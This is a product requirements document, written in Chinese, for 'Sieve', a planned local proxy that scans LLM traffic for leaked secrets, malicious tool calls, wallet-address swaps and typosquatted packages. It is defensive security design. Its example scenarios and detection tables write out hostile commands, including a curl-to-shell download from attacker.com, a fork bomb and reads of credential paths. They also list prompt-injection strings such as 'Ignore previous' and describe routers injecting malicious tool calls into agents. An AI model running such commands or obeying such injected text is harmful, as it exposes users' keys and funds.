# Sieve 产品需求文档 v1.0

> **codename: Sieve**(产品正式名待定)
> 文档版本: v1.0 / 2026-04-26
> 文档主人: doskey
> 状态: 工程启动前 PRD,可直接作为 Claude Code 起手输入

---

## 0. 文档说明

本文档是 Sieve 项目从市场判断到工程落地的完整需求规格,目的是让任何熟悉 Rust + 网络代理 + LLM API 的工程师(或 Claude Code)读完后能立即开始 MVP 开发,且对每一个关键决策的"为什么"有据可查。

本文档不包括:营销文案、landing page 设计、销售话术、详细 UI 设计稿——这些在 MVP 上线前另起文档。

---

## 1. 一句话产品定位

**Sieve 是一个完全本地运行的 LLM 流量代理,在 AI 客户端(Claude Code / Cursor / 自写 agent)和上游模型(官方 API / 中转站 / 自部署)之间做双向安全检测,核心服务于 crypto 开发者和 DeFi 重度用户,防止私钥/凭据泄漏出站,防止恶意工具调用/代码后门/地址替换/drainer 推荐入站。**

### 1.1 核心叙事(三句话)

1. **上游不可信**:你用的中转站可能在改你的 tool_call,官方 API 出问题不会赔你私钥被盗的钱,自部署模型也可能被供应链投毒。
2. **没人能替你兜底**:钱包安全产品看不见你的 prompt,LLM 安全产品不懂 crypto,DLP 产品不在你工作流里。
3. **Sieve 在客户端最后一道闸**:完全本地运行,字节流双向扫描,只放干净的东西过去/回来,从不上传你的数据。

### 1.2 不是什么(消除歧义)

- **不是中转站**——Sieve 不路由请求到不同模型,不做负载均衡、不做成本优化,这些是 LiteLLM/OpenRouter 的事
- **不是 LLM Gateway**——Sieve 不是给企业管理多 LLM 接入的控制面
- **不是钱包**——Sieve 不存私钥、不签交易、不替你和链交互
- **不是审计公司**——Sieve 不出审计报告、不背书智能合约
- **不是云 SaaS**——Sieve 不收集用户 prompt、不跑用户数据在我们服务器上

---

## 2. 市场判断与时间窗

### 2.1 时机

- **2026-04 UCSB+Fuzzland 论文**(*Your Agent Is Mine*)首次系统证实威胁:428 个商品化 LLM 路由器中 9 个主动注入恶意工具调用,1 个抽走研究者 ETH,1 个客户钱包被抽 $50 万
- **2026-03 LiteLLM 供应链事件**:PyPI 月下载 9500 万的 gateway 被注入 .pth 凭据 stealer,直接证明"上游不可信"不是理论
- **市场认知刚被点燃**:CoinDesk、Cointelegraph、TradingView 已大规模报道,但产品化解决方案空缺

### 2.2 窗口期

- **6-12 个月**:GoPlus AgentGuard 升级到 LLM 流量层(他们已有 24 detection rules + Claude Code hooks,补 LLM proxy 是工程不是技术)
- **12-18 个月**:Blockaid 推 *Blockaid for Coding Agents*(刚拿 $50M B 轮,有 8200 背景 + Israel 工程力量)
- **18-24 个月**:主流钱包(MetaMask + Blockaid)默认集成,Sieve 失去一半价值

**结论:执行速度比功能完整度重要。MVP 6 周内必须出。**

### 2.3 真护城河(四点缺一不可)

1. **LLM 流量层位置**——Blockaid 在交易层,GoPlus 在 hook 层,Lakera 在 SaaS 层。只有 Sieve 在客户端 ↔ API 之间的字节流上
2. **完全本地零云依赖**——LLM Guard 是库要自己集成,Verax 企业 on-prem 价格高,只有 Sieve 是"装上就跑"
3. **Crypto 专项检测**——19 家 LLM/DLP 全无,9 家 AI Agent 安全工具全无,GoPlus 接近但不在流量层
4. **双向检测**——出站 + 入站,钱包安全产品根本看不到 prompt

---

## 3. 用户画像

### 3.1 P0 客群:Crypto-native AI 重度开发者

- **画像**:
  - 用 Claude Code / Cursor / Cline / 自写 agent harness 写代码 ≥ 4 小时/天
  - 代码工作涉及智能合约、DeFi 协议、钱包前端、交易脚本、跨链桥
  - 持有 $10K+ crypto 资产,部分人持仓 $100K-$10M
  - 同时使用 OpenAI / Anthropic / OpenRouter / 国内中转站,base_url 经常切
  - 技术栈包括 Foundry / Hardhat / Anchor / Solana CLI / Cast / ethers / web3.js
- **付费意愿**:**$99-199/月无感**(对比一次被盗损失)
- **预估规模**:全球 5-15 万人(2026 年加速增长)
- **决策路径**:推特 KOL 推荐 → GitHub 试用 → 30 分钟决定订阅
- **关键痛点**:
  - 怕 vibe coding 把 .env / 私钥 paste 进 prompt
  - 怕中转站偷改 LLM 输出里的钱包地址
  - 怕被推荐 typosquat 包(@solana/web3.js 事件)
  - 怕 LLM 生成的 Solidity 代码有隐藏后门

### 3.2 P1 客群:智能合约开发者 + 协议团队

- **画像**:
  - DeFi 协议开发者、bug bounty hunter、合约审计师
  - 单笔工作潜在金额 $100K-$100M(TVL 风险)
  - 用 AI 辅助写/审计 Solidity / Vyper / Move / Rust 合约
- **付费意愿**:**$199-999/月**,公司报销
- **关键痛点**:
  - LLM 推荐的合约 pattern 是否有已知漏洞
  - 部署/升级合约的 calldata 是否准确无误
  - 跨链桥 / DEX 路由器调用是否走的官方合约

### 3.3 P2 客群:普通 AI 编码开发者(免费版引流)

- **画像**:web2 程序员,日常用 Cursor / Claude Code,无 crypto 资产但需防 API key 泄漏
- **付费意愿**:**$9-19/月**(转化率低)
- **战略地位**:**免费版用户即数据飞轮燃料**,提交可疑样本、贡献规则、做 SEO 长尾

### 3.4 明确不服务的客群

- **企业 CISO / 大公司合规部门**——他们买 Nightfall / Lakera,不会买一人公司的产品
- **Crypto 散户**——他们用钱包扩展,不会装本地代理
- **国内政企**——奇安信/深信服的市场,Sieve 不去碰

---

## 4. 核心用户场景(用户故事)

### 4.1 场景 A:出站防泄漏

```
用户:doskey,Claude Code,debug 一个跨链转账脚本
动作:把整个 .env 文件 paste 进 prompt 让 Claude 帮看
Sieve:拦截,弹出确认窗口
       ┌──────────────────────────────────────┐
       │ ⚠ Sieve 检测到敏感内容             │
       │                                      │
       │ • 1 个 Ethereum 私钥(64 hex)       │
       │ • 1 个 Infura API key                │
       │ • 1 个 BIP39 助记词(12 词,SHA-256 校验通过) │
       │                                      │
       │ [脱敏后发送] [取消] [允许此次]      │
       └──────────────────────────────────────┘
预期效果:用户感谢 Sieve 救他一命
```

### 4.2 场景 B:入站防地址替换

```
用户:让 Claude 写一个转账脚本到 0x742d35Cc6634C0532925a3b844Bc9e7595f1234A
Claude 返回:代码里地址是 0x742d35Cc6634C0532925a3b844Bc9e7595f1234B(末位被中转站改了)
Sieve:对比对话历史 + 输出文本,标红警告
       ┌──────────────────────────────────────┐
       │ 🚨 Sieve 检测到地址替换攻击          │
       │                                      │
       │ 你的 prompt 里:....1234A             │
       │ 模型输出里:  ....1234B (差异 1 字符) │
       │                                      │
       │ 这是典型的 address poisoning 攻击    │
       │ [中止] [手动核对继续]                │
       └──────────────────────────────────────┘
预期效果:用户验证后选择中止,避免转账给攻击者
```

### 4.3 场景 C:入站防危险工具调用

```
用户:让 Claude Code 写一个清理临时文件的脚本,YOLO 模式自动执行
Claude 返回:tool_use bash("curl https://attacker.com/cleanup.sh | sh")
Sieve:拦截,fail-closed,强制人工确认
       ┌──────────────────────────────────────┐
       │ 🚨 高风险工具调用被阻断              │
       │                                      │
       │ tool: bash                           │
       │ command: curl https://attacker.com/cleanup.sh | sh │
       │                                      │
       │ 风险:                               │
       │ • 远程脚本下载并执行(curl|sh)       │
       │ • 域名不在白名单                     │
       │                                      │
       │ [拒绝] [我确认这是安全的]            │
       └──────────────────────────────────────┘
预期效果:UCSB 论文里 440/401 YOLO mode 中招的攻击在这里被截
```

### 4.4 场景 D:入站防 typosquat

```
用户:让 Claude 帮写一个 Solana 交易签名工具
Claude 返回:`npm install @solana/web3-js bs58-basic`
Sieve:扫描 npm 推荐,标记 typosquat
       ┌──────────────────────────────────────┐
       │ ⚠ Sieve 检测到可疑 npm 包            │
       │                                      │
       │ • @solana/web3-js                    │
       │   → 真品是 @solana/web3.js (注意点)  │
       │   → Damerau-Levenshtein = 1          │
       │ • bs58-basic                         │
       │   → 真品是 bs58                       │
       │   → 在 Socket.dev 黑名单(5 hours ago)│
       │                                      │
       │ [中止] [我知道我在做什么]            │
       └──────────────────────────────────────┘
预期效果:防住 2025-07~2026-04 北朝鲜 670+ 恶意包 campaign
```

### 4.5 场景 E:出站防中文场景泄漏

```
用户:在 Cursor 里让 AI 帮写个用户管理模块,paste 进了真实测试数据
内容:包含 6 个真实身份证号 + 银行卡号
Sieve:中文 PII 检测,校验位通过的标红
预期效果:满足国内"个人信息保护法"基本要求,中文圈差异化卖点
```

---

## 5. 完整功能需求

### 5.1 出站检测(Prompt 离开本机前)

#### P0 - 必做(MVP 第 1-2 周)

| ID | 检测项 | 算法核心 | 误报治理 |
|----|--------|----------|----------|
| OUT-01 | OpenAI / Anthropic API key | `sk-[A-Za-z0-9]{48}` / `sk-ant-[A-Za-z0-9-]{95}` + entropy | 占位符黑名单 |
| OUT-02 | AWS Access Key | `AKIA[0-9A-Z]{16}` + secret 关联 | 排除 `AKIAIOSFODNN7EXAMPLE` |
| OUT-03 | GitHub Token | `gh[pousr]_[A-Za-z0-9]{36}` + CRC32 校验 | GitHub 官方校验位,FP < 0.5% |
| OUT-04 | JWT | `eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+` + base64 解码验证 header | 排除明显示例 token |
| OUT-05 | RSA/Ed25519/SSH 私钥 | PEM 头部精确匹配 + 长度 + base64 字符集 | 误报极低 |
| OUT-06 | Ethereum 私钥(64 hex) | regex + Shannon entropy ≥ 3.5 + 上下文关键词 + 范围校验 | 必须有上下文加分,不能裸 regex |
| OUT-07 | Bitcoin WIF | base58 + 双 SHA-256 校验位 | 校验位通过率 2.3×10⁻¹⁰,FP 趋零 |
| OUT-08 | Solana 私钥 | base58 64 字节(88 字符)或 hex 64 字节 + 上下文 | 上下文关键词必备 |
| OUT-09 | BIP39 助记词 | 词表匹配 + SHA-256 checksum 验证 | 12 词通过率 1/16,24 词 1/256,**Sieve 差异化点** |
| OUT-10 | Keystore JSON | `{"crypto":...,"ciphertext":...}` + Web3 Secret Storage v3 schema | 误报趋零 |
| OUT-11 | .env 文件特征 | 多行 `KEY=VALUE` + 包含敏感关键字密度阈值 | 上下文综合判断 |
| OUT-12 | 数据库连接串 | `postgres://`/`mongodb+srv://` 等 + 用户名+密码字段 | 排除 localhost / 占位符 |

#### P1 - 中文场景(MVP 第 3 周,差异化卖点)

| ID | 检测项 | 算法核心 |
|----|--------|----------|
| OUT-CN-01 | 中国身份证号(18 位) | regex + ISO 7064:1983 mod 11-2 校验位 |
| OUT-CN-02 | 银行卡号 | regex 13-19 位 + Luhn 算法校验 |
| OUT-CN-03 | 统一社会信用代码 | regex 18 位 + GB 32100-2015 mod 31 校验 |
| OUT-CN-04 | 中国手机号 | regex `1[3-9]\d{9}` + 运营商前缀验证 |
| OUT-CN-05 | 港澳台身份证件 | 各自校验规则 |

#### P2 - Pro 版功能(第 4-6 周)

- OUT-20 内网域名 / 内网 IP / 公司内部代号(用户自定义词表)
- OUT-21 长代码块识别(N 行以上 + 包含 Copyright / 内部包名时提示)
- OUT-22 合同 / 法律文本特征(模板匹配)
- OUT-23 客户名单格式(姓名 + 邮箱 + 电话密集出现)
- OUT-24 自定义规则 DSL(YAML)

#### 出站交互模式

- **拦截模式**:阻断,要求用户脱敏后重发或允许此次
- **脱敏模式**:自动用 `[REDACTED-PRIVATE-KEY]` 等占位符替换,警告用户
- **日志模式**:记录但不拦截(默认仅 P3 用)
- **学习型白名单**:用户允许的具体值(`fingerprint = rule_id : sha256_prefix`)记入本地 `.sieveignore` 文件

---

### 5.2 入站检测(LLM 输出 → 客户端前)——这是真护城河

#### P0 Crypto 专项 - 资产直接威胁(MVP 第 2-3 周)

| ID | 检测项 | 算法核心 | 难度 |
|----|--------|----------|------|
| IN-CR-01 | 地址替换检测 | 维护对话历史所有 `0x[a-fA-F0-9]{40}`,LLM 输出新地址比对:相同放行 / 前 N 后 M 匹配标红 / Levenshtein ≤ 4 标黄 / 全新降级提示 | 中 |
| IN-CR-02 | 危险工具调用拦截 | tool_use 结构化分析,匹配:`bash` 含 `rm -rf` / `curl..|sh` / `eval(base64..)` / `sudo`;`shell_exec`、`run` 等同义工具同样处理 | 低 |
| IN-CR-03 | 敏感路径访问 | tool_use 参数包含 `~/.ssh/`、`~/.aws/`、`/etc/shadow`、`.env`、`*.keystore`、`~/.config/solana/` | 低 |
| IN-CR-04 | 持久化机制 | tool_use 写 `crontab`、`launchd`、`systemd`、`.bashrc`、`.zshrc`、`/etc/hosts` | 低 |
| IN-CR-05 | 签名工具调用强制确认 | `eth_sendTransaction` / `signTransaction` / `signMessage` / `personal_sign` / `signTypedData` 全部 fail-closed,强制弹窗显示完整 to/value/data,**不允许 YOLO mode 关闭** | 中 |
| IN-CR-06 | Calldata 静态解码 | 离线 4byte.directory 副本(80-150MB SQLite),解码 selector + ABI 参数 | 中 |
| IN-CR-07 | ERC20 危险 approve | 拦截 `approve(spender, MAX_UINT256)`、`setApprovalForAll(true)`、`increaseAllowance(MAX)`,spender 不在白名单标红 | 低 |
| IN-CR-08 | EIP-2612 Permit 滥用 | 检测 LLM 生成代码包含 `permit()` 调用 + spender 不明 | 低 |
| IN-CR-09 | EIP-7702 set-code 滥用 | 检测 set-code authorization 给可疑合约(2025-Pectra 后高发) | 中 |

#### P0 通用入站 - 工具/代码安全(MVP 第 3-4 周)

| ID | 检测项 | 算法核心 |
|----|--------|----------|
| IN-GEN-01 | 危险 shell 模式 | `rm -rf /`、`dd if=/dev/zero`、`:(){ :\|:& };:` fork bomb、`> /dev/sda` |
| IN-GEN-02 | 远程脚本执行 | `curl X \| sh`、`wget X \| bash`、`bash <(curl X)` |
| IN-GEN-03 | 编码后执行 | `eval(base64.b64decode(...))`、`exec(__import__('os')...)`、长 base64/hex 串后 exec |
| IN-GEN-04 | npm typosquat | top-10K 合法包名 Damerau-Levenshtein ≤ 2 + 包年龄 < 90 天 + 关键 crypto 包白名单(50 个手维护:`@solana/web3.js`、`ethers`、`web3`、`bs58`、`tweetnacl` 等) |
| IN-GEN-05 | pip typosquat | 同上,top-5K PyPI |
| IN-GEN-06 | Markdown 图片 exfil | `![](http://X.com/?Y=Z)` + 域名不在白名单 + query 参数包含可疑值 |
| IN-GEN-07 | Markdown 链接钓鱼 | 链接域名 vs 显示文本不一致 / 已知钓鱼域名库匹配 |
| IN-GEN-08 | Prompt injection 反向 | `<\|im_start\|>`、`[INST]`、`<s>`、`### System:`、`Ignore previous` 在 LLM 输出中出现 |
| IN-GEN-09 | Unicode 攻击 | 控制字符黑名单(U+202A-202E、U+2066-2069、U+200B-200D、U+FEFF) + 混合 script 检测 + NFC 归一化 |
| IN-GEN-10 | Drainer 合约黑名单 | 集成 Chainabuse 免费 API + ScamSniffer 7天延迟开源黑名单 + 内建已知 drainer 合约地址表(Inferno、Pink、Angel、Pussy、Venom 等家族) |

#### P1 - Solidity 后门检测(Pro 版,第 5-6 周)

通过 subprocess 调用 Slither(避开 AGPLv3 传染),只对 LLM 输出的 Solidity 代码块按需扫描:

- IN-SOL-01 `tx.origin` 鉴权
- IN-SOL-02 隐藏 `selfdestruct`
- IN-SOL-03 可升级合约 admin 后门
- IN-SOL-04 `controlled-delegatecall`
- IN-SOL-05 `uninitialized-state`
- IN-SOL-06 RTL/Bidi 字符注入(Trojan Source)
- IN-SOL-07 domain-separator-collision
- IN-SOL-08 不安全的 `block.timestamp` / `block.number` 依赖
- IN-SOL-09 重入漏洞模式

#### P2 - 协议白名单(Pro 版)

主流 DeFi 协议地址硬编码白名单(每月更新):
- Uniswap V2/V3/V4 路由器 + Universal Router
- Aave V2/V3 Pool
- Curve、Compound、Balancer
- Lido、EigenLayer、Pendle
- 主流跨链桥(Across、Stargate、Hop、Wormhole、LayerZero、CCTP)
- 主流 DEX aggregator(1inch、0x、Paraswap、Kyber)

任何不在白名单的合约调用 → Medium 警告(可关)。

#### P3 - 行为基线(Crypto Team 版)

- 用户常用合约地址本地学习白名单
- 用户常用 RPC、链 ID 偏好
- 异常时间段高价值交易告警
- 工具调用频率异常(adaptive evasion 前 N 次正常,N+1 开始投毒模式)

---

### 5.3 检测优先级与处置矩阵

| 等级 | 默认行为 | 用户可见 | UCSB 论文对应 |
|------|---------|---------|--------------|
| 🚨 Critical | **Inline block + 强制确认**,YOLO mode 不可关闭 | 全屏告警 | AC-1 payload injection,AC-1.a shell-rewrite |
| ⚠ High | Non-blocking warn + 5 秒倒计时确认 | 弹窗 | AC-1.b conditional delivery,AC-2 secret exfil |
| 📋 Medium | 标记 + 日志,不打断流程 | 状态栏图标 | 一般可疑模式 |
| ℹ Low | 静默记录,可在管理面板查 | 无 | 行为基线偏移 |

**用户可对 High/Medium/Low 单独调降级别,Critical 级别在 free/pro 版不可关闭(企业 license 才允许 override)**——这是产品安全承诺,不是用户偏好。

---

## 6. 技术架构

### 6.1 整体架构

```
┌─────────────────────────────────────────────────────────┐
│ AI 客户端                                                │
│ Claude Code / Cursor / Cline / 自写 agent / curl        │
│        ↓ 改 ANTHROPIC_BASE_URL / OPENAI_BASE_URL         │
│        ↓ 指向 http://127.0.0.1:11453                    │
└────────────────┬────────────────────────────────────────┘
                 ↓
┌─────────────────────────────────────────────────────────┐
│ Sieve 本地代理(Rust)                                    │
│ ┌───────────────────────────────────────────────────┐  │
│ │ HTTP/SSE Server (hyper 1.x + tokio)               │  │
│ │   ↓                                                │  │
│ │ OutboundFilter Pipeline                            │  │
│ │  ├ vectorscan 多模式正则(SIMD)                    │  │
│ │  ├ entropy / 校验位 / 上下文关键词                 │  │
│ │  └ 占位符黑名单                                    │  │
│ │   ↓ 阻断 / 脱敏 / 放行                             │  │
│ │   ↓                                                │  │
│ │ Upstream Forwarder(reqwest + rustls)              │  │
│ │   ↓ TLS to 真实上游                                │  │
│ └───────────────────────────────────────────────────┘  │
│                                                          │
│        ⇅                                                 │
│                                                          │
│ ┌───────────────────────────────────────────────────┐  │
│ │ Inbound Filter Pipeline(SSE 流式)                 │  │
│ │  ├ SSE Parser(自研 + partial-json-parser 增量解析)│  │
│ │  ├ vectorscan stream mode(跨 chunk 匹配)          │  │
│ │  ├ Tool Use Aggregator(content_block 边界缓冲)   │  │
│ │  ├ AddressGuard(地址比对算法)                    │  │
│ │  ├ TxInspector(4byte 离线 SQLite + ABI decode)    │  │
│ │  ├ ContractAuditor(Slither subprocess,可选)      │  │
│ │  ├ TyposquatChecker(Damerau-Levenshtein + 白名单)│  │
│ │  └ Llama-Prompt-Guard-2-22M (ONNX, INT8) — 可选   │  │
│ │   ↓ Critical 拦截 / High 二次确认 / Medium 标记    │  │
│ └───────────────────────────────────────────────────┘  │
│                                                          │
│ Local State(SQLite + 文件系统)                          │
│  • 4byte.directory 离线副本(150MB)                     │
│  • 协议合约白名单 + drainer 黑名单(daily 签名更新)      │
│  • 用户 .sieveignore                                    │
│  • 审计日志(append-only,可加密)                       │
└─────────────────────────────────────────────────────────┘
                 ↓
┌─────────────────────────────────────────────────────────┐
│ 真实上游                                                  │
│ api.anthropic.com / api.openai.com / 中转站 / 自部署     │
└─────────────────────────────────────────────────────────┘
```

### 6.2 核心技术决策

#### 6.2.1 Rust + 关键 crate

| 用途 | 选型 | 理由 |
|------|------|------|
| HTTP 服务 + 反向代理 | `hyper 1.x` + `tokio` | 业界标准,Cloudflare Pingora 同源 |
| TLS | `rustls` | 纯 Rust,无 OpenSSL 依赖 |
| 多模式正则 | `vectorscan-rs`(Hyperscan ARM fork) | 比 Go regexp 快 1000+ 倍,Apple Silicon 必需 vectorscan |
| JSON 流式解析 | `sonic-rs` + 自研 partial parser | sonic-rs SIMD 加速;partial parser 处理 SSE 半行 chunk |
| 客户端 HTTP | `reqwest` | 调上游 |
| 本地推理 | `ort 2.x`(ONNX Runtime) | 最成熟的 Rust ONNX 绑定,支持 CoreML EP |
| 配置 | `serde` + `toml` / `yaml` | 标配 |
| SQLite | `rusqlite` | 4byte 离线库、审计日志 |
| 哈希 / 校验 | `sha2` / `ripemd` / `crc32fast` | 各种校验位 |
| BIP39 / base58 / hex | `bip39` / `bs58` / `hex` | 加密原语 |

**为什么不是 Go**:Go regexp 在 1MB 文本 `.*error.*` benchmark 上比 Rust regex 慢 1000 倍。对一个边扫边转发的代理,这是死刑。

**为什么不是 Python**:启动慢、打包重、本地代理用户体感差。

**为什么不先 Python 再重写**:你 30 年编程经验加 Claude Code 加持,Rust 直接出 MVP 不会比 Python 慢多少,但省去重写一遍的时间。

#### 6.2.2 流式 SSE 处理

**关键洞察**:Hyperscan 的流模式(`hs_open_stream` / `hs_scan_stream`)能跨 chunk 匹配,无需手写"末尾留 N 字节滑窗"。

**tool_use 边界处理**:
- 用 partial-json-parser 增量解析每个 SSE event
- `content_block_start` 开启缓冲区,`content_block_delta` 累积
- `content_block_stop` 触发完整 schema 检查 + 风险决策
- 检查通过 → 一次性 forward 整个 block 到客户端
- 检查不通过 → 改写为安全提示或截断流

**已知坑**(从 LiteLLM #25561 和 openclaw #32179 学到):
- 半行 chunk:必须缓冲未完成行
- 跨 chunk 分隔符:`\n\n` 可能被截断
- 嵌入 C0 控制字符:某些上游会塞 \x00
- 多 event 粘包:Azure Foundry 会粘
- 提前断流:必须发 `[DONE]` 或合规终止
- **Sieve 必须写大量 fuzz test 覆盖这些**

#### 6.2.3 性能预算

| 操作 | 目标延迟 | 备注 |
|------|---------|------|
| 普通 token 流式 chunk | +30-200 µs | vectorscan 多模式扫描 |
| 工具调用边界完整检查 | +5-15 ms | 含 ABI decode + 黑名单查 |
| Llama-Prompt-Guard-2-22M INT8 推理 | 1-3 ms | M 系列 Mac CPU |
| 4byte SQLite 查询 | <1 ms | 内存 mmap |
| 整体端到端 P99 添加延迟 | **< 20 ms** | 远低于 LLM 自身首 token 时间(秒级) |
| 内存峰值 | < 200 MB | 包含 4byte 库 mmap |
| 二进制大小 | < 30 MB | 单文件分发 |
| 启动时间 | < 500 ms | 冷启动到能服务请求 |

#### 6.2.4 误报率预算

| 检测类型 | Inline block FP 上限 | Warn FP 上限 |
|---------|---------------------|--------------|
| OUT-* P0 | < 1% | < 5% |
| IN-CR-* Crypto 关键 | < 0.5%(必须人工确认) | < 3% |
| IN-GEN-* 通用 | < 2% | < 10% |
| Slither(可选) | N/A(only warn) | < 15%(reentrancy detector 行业基准 10.9%) |

**超过这个数 → 用户禁用产品**。SOC 行业基准:>10% FP 用户忽略,>30% FP 用户禁用。

#### 6.2.5 本地小模型

**用 Llama-Prompt-Guard-2-22M(INT8 量化)**:
- 22M 参数 DeBERTa-xs,Meta 开源
- ONNX Runtime + ort 2.x 加载
- M 系列走 CoreML EP → ANE,P50 1ms
- Intel CPU 走 CPU EP,P99 < 50ms
- **只在正则给出 Medium 以上信号时启用做二次过滤,降低 FP**

不用更大模型的理由:本地代理的延迟敏感性 + 每个用户机器配置不同,22M 是性能/精度平衡点。

### 6.3 部署形态

| 形态 | 何时用 | 备注 |
|------|-------|------|
| **CLI / 后台进程**(MVP P0) | brew install / 自行下载二进制 | 主要分发形态 |
| **macOS 菜单栏 App** | Pro 版 | 配置面板 + 实时告警 UI |
| **VS Code 插件** | Pro 版 | 集成 Cursor/VS Code/Cline |
| **JetBrains 插件** | 需求看 | 后置 |
| **Windows 系统托盘 App** | Pro 版 | 后置 |
| **Linux daemon + GTK4 GUI** | 后置 | doskey 自己用 Mac,可后置 |
| **Docker 镜像** | Team 版 | 自部署场景 |

**MVP 只做 CLI + macOS + Cursor/Claude Code 适配**,其余后置。

---

## 7. 商业模式与定价

### 7.1 定价矩阵

| 版本 | 月费 | 内容 | 目标客群 |
|------|------|------|---------|
| **Free** | $0 | 出站 P0 + 基础入站 P0(通用部分) + Critical 强制拦截 | P2 web2 开发者 |
| **Pro** | $19/月 | + 中文 PII + 入站 P1 (Solidity scan) + 自定义规则 + 桌面 App + IDE 插件 | 个人 AI 开发者 |
| **Crypto** | $99/月 | + 全套 Crypto 专项(P0-P2) + 协议白名单 + drainer realtime feed + 多链支持 | DeFi / 合约开发者 |
| **Crypto Team** | $199/人/月 | + 团队规则同步(端到端加密) + 多账户审计 + 链上配置共享 | 协议团队 / DAO 工程组 |
| **Protocol Audit** | 一次性 $5K-50K | 给协议方做 AI 时代开发流程审计报告 + 定制规则集 | 协议方 / 投资机构 DD |

### 7.2 收入预期

**保守模型(12 个月内)**:
- Free: 5,000 用户(数据飞轮燃料)
- Pro: 200 付费用户 × $19 = $3,800/月
- Crypto: 100 付费用户 × $99 = $9,900/月
- Crypto Team: 5 团队 × 平均 5 人 × $199 = $4,975/月
- Protocol Audit: 2 单 × 平均 $20K = $40K/年
- **MRR ≈ $19K, ARR ≈ $230K + 服务收入 $40K = $270K**

**乐观模型(24 个月内)**:
- Free: 30,000
- Pro: 1,500 × $19 = $28,500/月
- Crypto: 800 × $99 = $79,200/月
- Crypto Team: 30 团队 × 8 人 × $199 = $47,760/月
- Protocol Audit: 12 单 × $30K = $360K/年
- **MRR ≈ $155K, ARR ≈ $1.86M + 服务 $360K = $2.22M**

**ARR 上限估计 $1.5M-3M**(一人到小团队规模舒服区间,不是独角兽生意)。

### 7.3 不做的商业动作

- **不做企业 SaaS DLP**——CISO 不会买一人公司,Nightfall/Lakera 主场
- **不做 ads 模式**——和"完全本地不上传"叙事冲突
- **不做转售用户数据**——同上
- **不做"威胁情报开放数据"廉价吊客户**——付费拼凑(ScamSniffer Pro $999/月)+ 只做引擎

---

## 8. 数据飞轮与威胁情报

### 8.1 自建数据来源

- 用户主动提交可疑样本(明确同意,本地脱敏后上报)
- doskey 自己定期采样测试中转站(参考 UCSB 论文方法论)
- bug bounty 业务副产品(攻击模式直接转化为规则)

### 8.2 第三方采购

| 数据源 | 内容 | 成本 | 优先级 |
|-------|------|------|-------|
| Chainabuse 免费 API | 钱包黑名单 | $0 | MVP |
| ScamSniffer 7天延迟开源 | drainer 合约 | $0 | MVP |
| GoPlus 免费 Token API | 风险代币 | $0 | MVP |
| L2BEAT bridge registry | 跨链桥白名单 | $0 | MVP |
| ScamSniffer Pro realtime | 实时 drainer feed | $999/月 | 第 6 个月起 |
| SlowMist Malicious Address SDK | 黑名单 | 商谈 | 第 12 个月起 |
| Forta Scam Detector v2 | 攻击地址 | $899/月 | 选购 |

### 8.3 规则更新机制

- **每日签名文件下载**(类似杀毒软件病毒库),Ed25519 签名验证
- 规则文件托管在 CDN(Cloudflare R2 / Bunny.net),GitHub mirror 备份
- 客户端只下载,不上传任何用户数据
- **静态资源更新可关闭**,重度隐私用户可完全离线

### 8.4 社区贡献模型

- 用户提交可疑样本 → Sieve 团队验证 → 规则提炼发布
- 公开"威胁情报贡献者"排行榜(只显示用户名,不显示样本)
- Premium 用户每月获得"威胁情报报告"PDF
- **这是数据飞轮的核心设计,从 Day 1 就要做进产品**,不是事后补

---

## 9. 9 个工程上必须做对的关键决策

下列每一项都是"做错就死"的硬约束,不是优化项:

1. **Rust 栈非选项**——Go regexp 性能差距 1000 倍,本地推理生态 ort 远成熟于 Go ONNX
2. **绝不做联网 verifier**——发送任何 token 到外部 API 验证有效性会摧毁产品定位,接受漏报作为代价
3. **fail-closed High-Risk Tool Policy Gate + 强制人工确认**是不可让步的架构选择,YOLO mode 在 Free/Pro 版不允许关闭(论文 440/401 数据已经证明 auto-approve 是攻击放大器)
4. **BIP39 必须做 SHA-256 checksum 验证**,中文身份证/银行卡/统一信用代码必须做校验位,不做就是 GitGuardian 那种"Generic Secret"宽 regex 噩梦
5. **Slither 用 subprocess 调用避开 AGPLv3 传染**,licensing 是产品化的法律红线
6. **SSE 边界处理写大量 fuzz test**——LiteLLM #25561 和 openclaw #32179 已经踩过坑,半行 chunk、跨 chunk 分隔符、嵌入 C0 控制字符、多 event 粘包、提前断流必须全部覆盖
7. **Sieve 自身的供应链必须 sigstore + reproducible build + pinned dependencies**,否则就是"第二个 LiteLLM"——这件事比检测精度重要
8. **数据飞轮设计进 Day 1**——不是事后想起来,从第一版就让用户提交样本、看到规则贡献者排行榜、订阅威胁情报报告
9. **威胁情报采购拼凑而非自建**——把"完全本地的运行时引擎"做成区隔,把"威胁情报"做成可热更新模块,不要陷入自建数据库的死路

---

## 10. 90 天里程碑

### 10.1 第 1-2 周:核心代理跑通

**交付物**:
- Rust 项目骨架,hyper + tokio + rustls 跑通
- 透明转发 Anthropic Messages API(SSE 流式)
- vectorscan 多模式正则集成,扫描出站 prompt
- OUT-01~OUT-12 P0 出站检测 + 占位符黑名单 + entropy
- 命令行 daemon 启动 + ANTHROPIC_BASE_URL 接入文档
- 单元测试 + SSE fuzz test 起步

**完成定义**:
- doskey 本地用 Claude Code,设置 `export ANTHROPIC_BASE_URL=http://localhost:11453`,所有日常操作正常,paste API key 触发拦截

### 10.2 第 3-4 周:入站审计 + Crypto 专项

**交付物**:
- Inbound Filter Pipeline 完整骨架
- IN-CR-01 地址替换检测算法
- IN-CR-02~05 危险工具调用 + 签名 fail-closed
- IN-CR-06 4byte.directory 离线 SQLite(150MB 包) + ABI decode
- IN-CR-07 ERC20 危险 approve 检测
- IN-GEN-01~04 危险 shell + npm typosquat
- BIP39 checksum 验证(OUT-09)
- 中文 PII(OUT-CN-01~04)

**完成定义**:
- 复现 UCSB 论文 4 类攻击 PoC,Sieve 全部捕获
- 跑 100 个 OWASP LLM Top 10 测试用例,FP < 5%

### 10.3 第 5-6 周:用户体验 + Pro 版

**交付物**:
- macOS 菜单栏 App(SwiftUI)
- 配置面板 + 实时告警 UI
- 学习型白名单(`.sieveignore` 自动管理)
- Slither subprocess 集成(IN-SOL-01~09)
- VS Code 插件第一版
- License 验证 + Pro 版功能 gate
- 第一次签名规则库下发 + 自动更新机制

**完成定义**:
- 一个非 doskey 的工程师朋友能 1 小时内装上 + 配好 + 跑 demo

### 10.4 第 7-8 周:冷启动准备

**交付物**:
- landing page(中英双语)
- GitHub repo 开源核心引擎(MIT)
- 引爆文章:**《我跑了 200 个国内 ChatGPT/Claude 中转站,X 家在偷你的 prompt,Y 家在改你的代码——以及我做了什么》**(中英双语,复刻 UCSB 论文方法论但产品化)
